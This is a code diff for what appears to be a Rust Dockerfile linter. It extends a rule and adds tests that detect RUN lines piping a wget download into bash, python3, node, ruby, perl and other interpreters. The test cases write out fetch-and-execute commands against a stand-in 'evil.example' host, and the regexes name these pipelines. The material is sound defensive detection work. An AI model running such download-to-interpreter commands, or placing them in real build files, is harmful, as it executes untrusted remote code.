@@ -73,6 +73,9 @@ fn dk_002() -> Rule {
     }
 }
 
+const DK003_EXECUTION_TARGETS: &str =
+    r"(?:bash|sh|zsh|dash|python(?:3)?(?:\s+-m\s+\S+)?|node|ruby|perl)";
+
 fn dk_003() -> Rule {
     Rule {
         id: "DK-003",
@@ -92,6 +95,12 @@ fn dk_003() -> Rule {
             // wget -qO- pattern (common)
             Regex::new(r"wget\s+-[a-zA-Z]*O-\s+[^|]*\|\s*(bash|sh)")
                 .expect("DK-003: invalid regex"),
+            // Direct wget URL-to-interpreter pipelines (wget writes the
+            // response to stdout when used in a pipeline in shell contexts).
+            Regex::new(&format!(
+                r"RUN\s+.*wget\s+[^|]*https?://[^|]*\|\s*{DK003_EXECUTION_TARGETS}"
+            ))
+            .expect("DK-003: invalid regex"),
             // curl ... && bash
             Regex::new(r"RUN\s+.*curl.*&&\s*(bash|sh)\s").expect("DK-003: invalid regex"),
             // Multi-line RUN with pipe to shell (common pattern)
@@ -330,14 +339,26 @@ mod tests {
             // Should detect
             ("RUN curl -fsSL https://get.docker.com | bash", true),
             ("RUN wget -qO- https://install.example.com | sh", true),
+            ("RUN wget https://evil.example/install.sh | bash", true),
+            ("RUN wget https://evil.example/install.sh | dash", true),
+            ("RUN wget https://evil.example/install.sh | python3", true),
+            (
+                "RUN wget https://evil.example/install.sh | python -m runpy",
+                true,
+            ),
+            ("RUN wget https://evil.example/install.sh | node", true),
+            ("RUN wget https://evil.example/install.sh | ruby", true),
+            ("RUN wget https://evil.example/install.sh | perl", true),
             ("curl -sSL https://example.com/install.sh | bash", true),
             // Should not detect
             ("RUN apt-get update && apt-get install -y curl", false),
             ("RUN curl -o script.sh https://example.com/script.sh", false),
+            ("RUN wget https://example.com/install.sh", false),
             (
                 "RUN curl -fsSL http://localhost:8080/install.sh | bash",
                 false,
             ), // localhost excluded
+            ("RUN wget http://127.0.0.1:8080/install.sh | python3", false), // localhost excluded
         ];
 
         for (input, should_match) in test_cases {
